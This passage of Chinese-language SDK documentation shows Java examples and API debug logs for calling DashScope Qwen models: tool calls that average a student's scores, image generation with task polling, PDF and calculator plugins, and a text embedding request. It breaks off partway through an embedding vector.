2024-03-20 23:50:20 DEBUG dashscope://chat/function/query_score <= {""name"":""张三"",""subjects"":[""CHINESE"",""MATH"",""ENGLISH""]}
2024-03-20 23:50:20 DEBUG dashscope://chat/function/query_score => {""message"":""查询成功"",""data"":[{""name"":""张三"",""subject"":""CHINESE"",""value"":90.0},{""name"":""张三"",""subject"":""MATH"",""value"":80.0},{""name"":""张三"",""subject"":""ENGLISH"",""value"":70.0}],""success"":true}
2024-03-20 23:50:20 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""张三的所有成绩，并计算平均分""},{""role"":""assistant"",""tool_calls"":[{""function"":{""arguments"":""{\""name\"": \""张三\"", \""subjects\"": [\""CHINESE\"", \""MATH\"", \""ENGLISH\""]}"",""name"":""query_score""},""type"":""function""}],""content"":""""},{""role"":""tool"",""name"":""query_score"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""张三\"",\""subject\"":\""CHINESE\"",\""value\"":90.0},{\""name\"":\""张三\"",\""subject\"":\""MATH\"",\""value\"":80.0},{\""name\"":\""张三\"",\""subject\"":\""ENGLISH\"",\""value\"":70.0}],\""success\"":true}""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query""},""subjects"":{""type"":""array"",""description"":""the subjects to query"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]}},""type"":""function""},{""function"":{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}}},""type"":""function""}]}}
2024-03-20 23:50:24 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""tool_calls"",""message"":{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""compute_avg_score"",""arguments"":""{\""scores\"": [90.0, 80.0, 70.0]}""},""id"":"""",""type"":""function""}],""content"":""张三的成绩如下：\n\n- 中文: 90.0分\n- 数学: 80.0分\n- 英语: 70.0分\n\n现在我们来计算他的平均分。""}}]},""usage"":{""total_tokens"":93,""output_tokens"":85,""input_tokens"":8},""request_id"":""0f662c8b-ca5d-9512-9f92-597045977eca""}
2024-03-20 23:50:24 DEBUG dashscope://chat/function/compute_avg_score <= {""scores"":[90.0,80.0,70.0]}
2024-03-20 23:50:24 DEBUG dashscope://chat/function/compute_avg_score => {""avg_score"":80.0}
2024-03-20 23:50:24 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""张三的所有成绩，并计算平均分""},{""role"":""assistant"",""tool_calls"":[{""function"":{""arguments"":""{\""name\"": \""张三\"", \""subjects\"": [\""CHINESE\"", \""MATH\"", \""ENGLISH\""]}"",""name"":""query_score""},""type"":""function""}],""content"":""""},{""role"":""tool"",""name"":""query_score"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""张三\"",\""subject\"":\""CHINESE\"",\""value\"":90.0},{\""name\"":\""张三\"",\""subject\"":\""MATH\"",\""value\"":80.0},{\""name\"":\""张三\"",\""subject\"":\""ENGLISH\"",\""value\"":70.0}],\""success\"":true}""},{""role"":""assistant"",""tool_calls"":[{""function"":{""arguments"":""{\""scores\"": [90.0, 80.0, 70.0]}"",""name"":""compute_avg_score""},""type"":""function""}],""content"":""张三的成绩如下：\n\n- 中文: 90.0分\n- 数学: 80.0分\n- 英语: 70.0分\n\n现在我们来计算他的平均分。""},{""role"":""tool"",""name"":""compute_avg_score"",""content"":""{\""avg_score\"":80.0}""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query""},""subjects"":{""type"":""array"",""description"":""the subjects to query"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]}},""type"":""function""},{""function"":{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}}},""type"":""function""}]}}
2024-03-20 23:50:25 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":""张三的平均分是 80.0 分。""}}]},""usage"":{""total_tokens"":68,""output_tokens"":13,""input_tokens"":55},""request_id"":""c01da60a-21d7-9e2f-ae5d-17a9b622ed41""}
张三的平均分是 80.0 分。
```

### 文生图示例

```java
// 创建请求
final var request = GenImageRequest.newBuilder()
    .model(GenImageModel.WANX_V1)
    .option(GenImageOptions.NUMBER, 1)
    .option(GenImageOptions.STYLE, GenImageRequest.Style.ANIME)
    .prompt(""画古风美少女，黑发，面容白皙精致，发饰精美"")
    .build();

// 任务应答
final var response = client.image().generation(request)
    .task(Task.WaitStrategies.perpetual(Duration.ofSeconds(1L)))
    .toCompletableFuture()
    .join();
```

输出日志

```text
2024-02-29 01:27:01 DEBUG dashscope://image/generation/wanx-v1 => {""model"":""wanx-v1"",""input"":{""prompt"":""画古风美少女，黑发，面容白皙精致，发饰精美"",""negative_prompt"":null},""parameters"":{""style"":""<anime>"",""n"":1}}
2024-02-29 01:27:02 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:02 DEBUG dashscope://task/get <= {""request_id"":""becb655f-2e7c-9a82-8d0a-c0e48f925221"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:03 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:03 DEBUG dashscope://task/get <= {""request_id"":""f329109b-8d7f-9e7f-9049-faced6937cc8"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:04 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:04 DEBUG dashscope://task/get <= {""request_id"":""ec190c02-33b4-91ca-8fa2-2abb0dfd979e"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:05 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:05 DEBUG dashscope://task/get <= {""request_id"":""f7e2dbe9-11e8-9681-9a07-1e5076369d62"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
...
2024-02-29 01:27:26 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:26 DEBUG dashscope://task/get <= {""request_id"":""5e50bc5e-9215-9737-9ecb-dc3fd8c586d1"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:27 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:27 DEBUG dashscope://task/get <= {""request_id"":""408498bc-26c9-9792-b47d-d8b4950a116c"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:28 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:29 DEBUG dashscope://task/get <= {""request_id"":""cd3bcc40-3ad6-9f7c-acad-f29653f53c2d"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:30 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:30 DEBUG dashscope://task/get <= {""request_id"":""34b79abd-aa21-988c-87b5-f00261a40ad9"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:31 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:31 DEBUG dashscope://task/get <= {""request_id"":""682cec73-19d1-9fbd-a50c-465908c64106"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:32 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:32 DEBUG dashscope://task/get <= {""request_id"":""7414bd26-8b51-9e04-abad-c223985ee809"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""SUCCEEDED"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""end_time"":""2024-02-29 01:27:32.081"",""results"":[{""url"":""https://dashscope-result-bj.oss-cn-beijing.aliyuncs.com/1d/a8/20240229/c34adf05/3464efa2-8874-4aa9-86a4-8aba14b9707d-1.png?Expires=1709227651&OSSAccessKeyId=LTAI5tQZd8AEcZX6KZV4G8qL&Signature=yZ04L3oCKULBD%2By3PGSdmh0jg6M%3D""}],""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":1,""FAILED"":0}},""usage"":{""image_count"":1}}
2024-02-29 01:27:32 DEBUG dashscope://image/generation/wanx-v1 <= {""request_id"":""7414bd26-8b51-9e04-abad-c223985ee809"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""SUCCEEDED"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""end_time"":""2024-02-29 01:27:32.081"",""results"":[{""url"":""https://dashscope-result-bj.oss-cn-beijing.aliyuncs.com/1d/a8/20240229/c34adf05/3464efa2-8874-4aa9-86a4-8aba14b9707d-1.png?Expires=1709227651&OSSAccessKeyId=LTAI5tQZd8AEcZX6KZV4G8qL&Signature=yZ04L3oCKULBD%2By3PGSdmh0jg6M%3D""}],""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":1,""FAILED"":0}},""usage"":{""image_count"":1}}
```

然后你就可以通过`response.output().results().get(0)`拿到生成的图片地址。

![文生图-美女](https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-003.png)

### 插件调用示例

#### PDF提取插件

我从网上下载了一份[《第十四个五年规划》](https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf)
的PDF文件，然后通过`PDF提取插件`来提取PDF文件的内容。

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .plugins(List.of(ChatPlugin.PDF_EXTRACTER))
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofText(""请总结这篇文档""),
            Content.ofFile(URI.create(""https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf""))
        ))
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

输出日志

```text
2024-03-20 00:24:22 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":[{""text"":""请总结这篇文档""},{""file"":""https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf""}]}]},""parameters"":{""result_format"":""message""}}
2024-03-20 00:24:47 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":""这篇文档是中国国民经济和社会发展第十四个五年规划和2035年远景目标纲要，它阐述了中国在新发展阶段的主要任务和战略目标。规划涵盖了多个领域，包括创新驱动发展、产业升级、市场体系建设、数字化发展、深化改革、乡村振兴、城镇化、区域协调发展、文化建设、绿色发展、对外开放、教育与健康、民生福祉、国家安全、国防和军队现代化、民主法治以及监督制度的完善。\n\n在创新驱动方面，强调了强化国家战略科技力量，提升企业创新能力，激发人才创新活力，并完善科技创新机制。在产业发展上，致力于制造业升级，发展战略性新兴产业，促进服务业繁荣，同时建设现代化基础设施体系。\n\n为了构建新发展格局，规划提出畅通国内大循环，促进国内外双循环，加快培育完整内需体系。数字化发展被放在重要位置，旨在打造数字经济新优势，加速数字社会建设，提升数字政府水平，并营造健康的数字环境。\n\n在深化改革方面，将激发各类市场主体活力，建设高标准市场体系，改革财税金融体制，提升政府经济治理能力。农业、农村发展和乡村振兴是关注焦点，包括提高农业质量和效益，实施乡村建设行动，以及城乡融合发展。\n\n此外，规划还强调优化区域经济布局，促进区域协调发展，发展社会主义先进文化，推动绿色发展，实行高水平对外开放，提升国民素质，增进民生福祉，加强国家安全和国防建设，以及加强民主法治和监督制度。\n\n最后，规划提出了一系列实施保障措施，包括加强党的领导，健全规划体系，完善实施机制，确保党中央重大决策的贯彻落实，激发全社会参与规划实施的积极性，并通过监测评估、政策保障和考核监督机制，确保规划目标的实现。整个规划为全面建设社会主义现代化国家描绘了蓝图，是全国各族人民共同遵循的行动纲领。""}}]},""usage"":{""total_tokens"":365,""output_tokens"":361,""input_tokens"":4},""request_id"":""d1eb2274-35cc-97fb-b60a-570fab96ab0b""}
```

#### 计算器插件

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .plugins(List.of(ChatPlugin.CALCULATOR))
    .messages(List.of(
        Message.ofUser(""1+2*3-4/5=?"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

输出日志

```text
2024-03-20 00:29:11 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""1+2*3-4/5=?""}]},""parameters"":{""result_format"":""message""}}
2024-03-20 00:29:15 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""stop"",""messages"":[{""role"":""assistant"",""plugin_call"":{""name"":""calculator"",""arguments"":""{\""payload__input__text\"": \""1+2*3-4/5\""}""},""content"":""""},{""role"":""plugin"",""name"":""calculator"",""content"":""{\""equations\"": [\""1 + 2 * 3 - 4 / 5\""], \""results\"": [6.2]}"",""status"":{""code"":200,""name"":""Success"",""message"":""success""}},{""role"":""assistant"",""content"":""The result of the expression \\(1 + 2 \\times 3 - \\frac{4}{5}\\) is approximately 6.2.""}]}]},""usage"":{""total_tokens"":103,""output_tokens"":93,""input_tokens"":10},""request_id"":""3659340f-7dad-9815-bd11-ce6c6eb4d1c2""}
```

### 向量计算示例

#### 文本向量计算

```java
// 请求
final var request = EmbeddingRequest.newBuilder()
    .model(EmbeddingModel.TEXT_EMBEDDING_V2)
    .documents(List.of(
        ""我爱北京天安门"", 
        ""天安门上太阳升""
    ))
    .build();

// 应答
final var response = client.embedding(request)
    .async()
    .toCompletableFuture()
    .join();
```

输出日志

```text
2024-03-29 00:06:04 DEBUG dashscope://embedding/text-embedding-v2 => {""model"":""text-embedding-v2"",""input"":{""texts"":[""我爱北京天安门"",""天安门上太阳升""]},""parameters"":{}}
2024-03-29 00:06:05 DEBUG dashscope://embedding/text-embedding-v2 <= {""output"":{""embeddings"":[{""embedding"":[-0.04154389871036614,-0.006419809590355932,0.047459534772683644,-0.017466811782486734,0.012682765194211021,-0.008638173113724997,-0.01198812611113586,-0.010318751540519745,-0.011618398857241015,0.024491629606488773,0.009825781868659952,0.014195285778326293,-0.004310683664728525,0.009540083536104844,-0.009002298439530525,0.034126945920111985,0.00946725847094374,0.0031062691255256234,-0.007248894947574674,0.02547756895020836,-0.019539525175533586,0.03952720459821244,0.043605408247234356,-0.010492411311288535,-0.009175958210299316,0.021914742685403495,0.03372360709768125,-0.012133776241458071,0.025141453264849407,0.00010241024788280488,-0.018172654721740525,0.012593134344781967,0.0057531801477273495,-0.006128509329711509,0.07645511456298233,-0.004946502502865871,-0.021522607719151387,-0.015371690677082616,-0.038608488391564645,-0.04893844378826302,-0.0028121679008365425,0.021231307458506966,-0.023079943727981188,0.038675711528636435,0.0338132379471103,-0.000059389190759387267,-0.021455384582079597,-0.02420032934584435,0.015920679629835566,0.02684443940400142,0.01676096884323294,0.09608427058794498,0.0316172821360985,0.00848692105531347,-0.007316118084646463,-0.009344016052978792,0.005722369543236112,0.044255231905594994,-0.003896140986119154,0.019371467332854112,-0.038541265254492856,-0.013993616367110924,-0.018105431584668735,-0.03683827911534084,-0.013354996564928919,-0.004081004613066576,0.023886621372842663,-0.022676604905550447,-0.011797660556099121,0.0057755878600846125,0.0002751947173876398,-0.017545238775737153,0.025163860977206673,-0.015550952375940721,0.043851893083164256,0.0245364450312033,0.02256456634376413,-0.0218811311168676,-0.032401552068602714,0.0064254115184452475,-0.016189572178122724,0.0005696460625823027,0.046115072031247845,-0.0020951211054041174,0.011416729446025646,0.007915524390203257,0.010402780461859482,0.001632962038035562,0.021309734451757385,0.005240603727554951,-0.028278532994866268,0.0161447567534082,-0.005243404691599609,0.008542940336206629,0.03166209756081303,-0.06292085629919532,0.016604114856732095,-0.02263178948083592,0.003719680251305706,0.012021737679671754,-0.030160780832876384,-0.027292593651146686,0.0005973055825232995,-0.0012877432195314746,-0.000897008735301696,-0.024155513921129825,0.006083693904996983,-0.01192090297406407,0.00919836592265658,0.049521044309551863,0.008923871446280105,-0.010946167486523117,0.009579297032730055,0.00006661042618702095,0.031751728410242076,0.01185367983699228,0.017276346227449994,0.0006046581131405266,-0.03291692945281977,-0.0071256525296097255,-0.015069186560259561,0.01118144846627438,0.03990813570828591,-0.030608935080021653,-0.029152433776799536,-0.009321608340621528,0.044008747069665094,-0.05785671330645381,-0.00882303674067242,-0.03428379990661283,0.019113778640745583,-0.019909252429428433,0.03544900094919052,-0.04961067515898092,-0.029331695475657643,0.0056439425499856906,0.050148460255555236,0.010850934709004747,0.04320206942480362,0.023147166865052977,0.02420032934584435,-0.0038205149569133907,-0.016055125903979145,0.003453588667063204,-0.052837385738426834,0.008156407298043837,0.023752175098699084,0.012223407090887123,0.009125540857495474,-0.008077980304793415,0.019954067854142957,-0.05091032247570219,-0.020402222101288222,-0.018923313085708847,-0.009086327360870262,0.010912555917987222,0.009164754354120685,0.0005412863016301413,0.030071149983447332,-0.009624112457444583,-0.07107726359723915,0.031303574163096815,0.001981682061595472,0.003543219516492257,0.002997031527783965,-0.026889254828715944,0.009495268111390318,-0.037846626171417694,-0.009657724025980478,0.005344239397207294,0.018452751126206316,-0.026956477965787734,0.02487256071656225,0.0512688458734184,-0.0119321068302427,-0.006935186974572988,-0.04340373883601899,0.01431852819629124,0.0015153215481599298,0.03621086316933747,0.010010645495607373,0.0026217023457998046,-0.0009068121094579987,-0.030429673381163546,-0.02803204815893637,0.05588483461901464,-0.03524733153797515,0.018251081714990947,-0.015170021265867245,-0.03544900094919052,0.03289452174046251,-0.017758112043131154,-0.04992438313198261,0.053419986259715675,0.036569386567053684,0.003870932309717233,0.042193722368726774,0.04371744680902068,-0.017702092762237998,0.019685175305855798,-0.021477792294436863,-0.014251305059219451,-0.01921461334635327,0.0022197640053913943,0.000709344144309616,0.004428324154604158,0.014273712771576715,0.013668704537930605,-0.020301387395680538,-0.013881577805324606,-0.017623665768987575,-0.0006263655844866254,-0.010582042160717588,-0.012290630227958914,0.009937820430446269,0.017690888906059365,-0.009556889320372791,0.03222229036974461,-0.002870988145774359,-0.007086439032984514,0.02181390797979581,0.010245926475358639,0.0263066543074271,0.02015573726535833,-0.040580367079003817,-0.04499468641338468,0.010335557324787692,0.021511403862972758,-0.03320822971346419,-0.0014382950369318374,-0.03923590433756802,0.017343569364521784,0.02070472621811128,-0.01240266878974523,0.024245144770558877,-0.033409899124679565,-0.012290630227958914,0.007383341221718253,-0.015595767800655249,-0.008430901774420312,0.04750435019739817,-0.007332923868914411,-0.0005913535339284015,-0.011685621994312804,0.02778556332300648,-0.024424406469416984,-0.02467089130534688,-0.011629602713419646,0.003910145806342444,0.018172654721740525,-0.014565013032221137,-0.0032575211839371504,0.0148002940119724,-0.02413310620877256,-0.0025712849929959624,-0.02482774529184772,0.016391241589338097,-0.019124982496924216,-0.020357406676573698,0.018452751126206316,0.03114672017659597,-0.03486640042790168,0.0484006586916887,0.014755478587257875,-0.0061621208982474045,-0.00977536451585611,0.00022950399140915758,0.0075345932801297805,-0.00484006586916887,-0.01977480615528485,-0.01779172361166705,0.005178982518572477,0.004389110657978946,0.0386981192409937,0.024626075880632353,-0.026082577183854466,0.03479917729082989,-0.007232089163306726,-0.03535937009976147,-0.02160103471240181,-0.052434046915996096,0.017119492240949153,-0.0031258758738382285,0.00903591000806642,-0.00899669651144121,0.034126945920111985,-0.009461656542854423,-0.03966165087235602,0.020895191773148015,0.02173548098654539,0.013097307872820391,-0.007327321940825095,0.0012261220105490005,-0.016335222308444936,0.007814689684595571,0.04889362836354849,0.02079435706754033,0.0034479867389738883,0.008845444453029682,-0.0024396396828970405,-0.009461656542854423,0.018979332366602004,-0.01397120865475366,-0.008122795729507942,0.03500084670204526,-0.03385805337182483,-0.005263011439912215,-0.03939275832406886,0.027471855350004792,-0.04252983805408572,-0.005195788302840425,-0.00910313314513821,-0.017287550083628627,-0.002067111464957538,-0.01964035988114127,-0.003260322147981808,-0.026934070253430472,0.0010678675420258286,-0.02482774529184772,0.015943087342192828,-0.028816318091440588,0.037465695061344215,0.012156183953815333,0.014027227935646818,0.0008781022280002551,-0.03258081376746082,-0.038406818980349276,-0.01909137092838832,0.006722313707178986,-0.014677051594007454,-0.015898271917478304,-0.024648483592989618,-0.020525464519253172,0.00163576300208022,0.046025441181818796,-0.04004258198242949,-0.018239877858812318,-0.00014057338299126892,0.01273878447510418,0.03168450527317029,0.018564789687992633,0.020603891512503594,-0.005377850965743189,-0.03020559625759091,0.02868187181729701,0.0002687174880343683,0.023326428563911084,0.03910145806342444,0.01141112751793633,0.030228003969948174,0.0015405302245618511,0.020357406676573698,0.023124759152695712,0.0028527818794840823,0.03141561272488313,-0.02291188588530171,-0.021511403862972758,0.06991206255466145,-0.02271021647408634,-0.03031763481937723,-0.0034087732423486775,0.02467089130534688,-0.0256344229367092,0.005299423972492768,-0.04965549058369544,0.004658003206266106,-0.005324632648894689,-0.001445297447043482,-0.08963084942905315,-0.036502163429981895,-0.023214390002124767,-0.02720296280171763,0.031998213246171976,0.016391241589338097,-0.018363120276777264,0.01756764648809442,-0.022642993337014552,-0.018038208447596946,0.033163414288749665,-0.007478573999236622,0.021085657328184754,0.0067279156352683025,0.006078091976907667,-0.014553809176042506,-0.013119715585177655,-0.01756764648809442,0.01865442053742169,-0.019181001777817373,-0.012010533823493123,-0.011175846538185064,-0.028435386981367113,-0.016391241589338097,0.002071312911024525,0.018295897139705475,0.031034681614809653,-0.0028737891098190166,0.01141112751793633,0.018788866811565268,-0.005758782075816665,-0.021578627000044547,0.03004874227109007,-0.019853233148535272,-0.0296005880239448,-0.014878721005222823,-0.005949247630853403,0.015517340807404826,-0.028099271296008164,0.014441770614256189,-0.10576440232628272,0.004851269725347502,-0.001069968265059322,0.009898606933821058,0.022855866604408553,-0.0055235010960654005,0.002205759185168105,-0.019561932887890852,-0.00378130146028818,-0.05077587620155861,-0.0035124089120010206,0.03565067036040589,0.02446922189413151,-0.004677609954578711,0.009752956803498846,-0.007557000992487043,-0.040714813353147396,0.006627080929660617,0.00003549346625339946,-0.0014284916627755346,-0.013175734866070814,0.013724723818823763,0.008806230956404473,0.021780296411259916,-0.0006932386010528329,0.009327210268710844,-0.03591956290869305,0.0009719345234962951,0.01513640969733135,0.04031147453071666,-0.021040841903470227,-0.011018992551684221,0.0333874914123223,-0.03264803690453261,0.014957147998473244,-0.010184305266376164,-0.027023701102859524,0.051492922996991035,0.012850823036890495,0.01165201042577691,0.030788196778879756,0.006251751747676457,-0.10737775761600568,0.015080390416438192,0.012581930488603336,0.0013787745509828567,-0.027315001363503948,0.01887849766099432,-0.0070528274644486195,-0.006677498282464459,-0.00620693632296193,0.02370735967398456,0.019393875045211374,0.014957147998473244,-0.0018192261470053133,0.026709993129857838,-0.01267156133803239,-0.02964540344865933,0.019685175305855798,0.02841297926900985,0.018508770407099476,-0.023393651700982874,0.01915859406546011,-0.007164866026234936,0.022351693076370128,-0.01704106524769873,-0.02167946170565223,-0.018732847530672107,-0.043851893083164256,-0.015338079108546721,-0.02037981438893096,-0.017354773220700417,0.023595321112198243,0.011898495261706806,-0.012391464933566599,-0.02241891621344192,-0.021892334973046233,-0.018127839297026,-0.007019215895912725,0.03370119938532398,-0.03961683544764149,0.006526246224052933,0.036883094540055374,-0.0201109218406438,0.00009750856080465353,-0.03264803690453261,0.02271021647408634,0.010794915428111588,-0.000307755924406788,0.004380707765844973,-0.026149800320926255,0.016536891719660305,0.007741864619434466,0.011808864412277752,-0.04286595373944467,-0.017612461912808946,-0.027090924239931313,-0.02079435706754033,0.01240266878974523,0.02323679771448203,0.01322055029078534,0.052568493190139676,0.0038877380939851803,0.016604114856732095,0.03482158500318715,-0.033028968014606086,0.023752175098699084,-0.04140945243622256,-0.002676321144670634,-0.010906953989897905,0.027023701102859524,-0.04116296760029266,0.026799623979286893,0.006145315113979457,0.014912332573758718,0.051627369271134614,-0.02172427713036676,-0.016447260870231253,0.0026048965615318572,0.017534034919558524,0.0008185817420512745,0.014957147998473244,0.02181390797979581,-0.03551622408626231,0.018273489427348213,0.015170021265867245,-0.008274047787919469,-0.016615318712910727,-0.013265365715499867,-0.014508993751327979,-0.014195285778326293,0.009607306673176635,0.03695031767712716,-0.02133214216411465,-0.019248224914889166,-0.00034819484280153653,0.011864883693170911,-0.012369057221209335,-0.024558852743560563,0.015786233355691986,-0.01323175414696397,0.009338414124889475,-0.015304467540010826,0.02460366816827509,0.010262732259626586,0.019909252429428433,-0.010206712978733427,0.012055349248207649,-0.05068624535212956,0.012537115063888809,0.003680466754680495,0.036614201991768215,-0.0063301787409268786,-0.008173213082311784,-0.017511627207201258,-0.03690550225241263,-0.013590277544680184,0.026777216266929627,0.00722648723521741,-0.05037253737912787,-0.00661027514539267,0.009472860399033054,-0.026530731430999734,0.03222229036974461,-0.01826228557116958,-0.01226822251560165,0.0108341289247368,-0.025992946334425414,0.016548095575838938,0.02556719979963741,-0.00046846123646903564,-0.011685621994312804,0.02174668484272402,0.0063413825971055104,0.017085880672413258,-0.03627808630640926,-0.025522384374922883,-0.014329732052469872,0.03349952997410861,-0.011220661962899591,-0.001634362520057891,0.02814408672072269,-0.000595204859489806,0.008117193801418626,-0.013859170092967343,0.00154193070658418,0.021410569157365073,-0.026597954568071524,0.014587420744578401,-0.01867682824977895,0.031101904751881442,-0.009299200628264264,-0.022385304644906026,-0.013186938722249445,-0.04248502262937119,0.013399811989643446,0.01158478728870512,-0.04230576093051309,-0.006470226943159774,0.005008123711848345,0.03910145806342444,0.022452527781977816,0.026642769992786048,-0.013814354668252817,-0.014419362901898925,-0.03916868120049623,0.03318582200110693,0.013377404277286183,0.007512185567772518,0.01438575133336303,0.017164307665663677,0.0024382392008747114,0.014598624600757032,0.019561932887890852,-0.006290965244301668,0.010380372749502218,-0.042821138314730146,0.006711109851000355,-0.0015223239582715746,0.029466141749801222,-0.018643216681243056,-0.026799623979286893,-0.008559746120474577,0.01964035988114127,-0.013668704537930605,-0.00910313314513821,0.039706466297070545,-0.009836985724838583,-0.021511403862972758,0.000945325365072045,-0.008223630435115627,0.0012331244206606454,-0.027292593651146686,-0.01403843179182545,0.015898271917478304,-0.0010300545274229468,-0.0029438132109354644,0.0022225649694360525,0.0027281389794968055,-0.005943645702764087,0.008744609747421998,0.00950647196756895,0.00820682465084768,-0.018217470146455052,-0.02213881980897613,0.020760745499004436,0.008374882493527153,0.01848636269474221,-0.02290068202912308,0.00033839146864523385,0.01308610401664176,0.006212538251051247,0.006380596093730721,-0.010660469153968009,-0.022474935494335078,-0.006201334394872615,-0.025007006990705828,0.018665624393600318,-0.012862026893069128,-0.015248448259117668,0.00422385377934413,0.02146658843825823,-0.009114337001316843,0.03500084670204526,-0.00698000239928751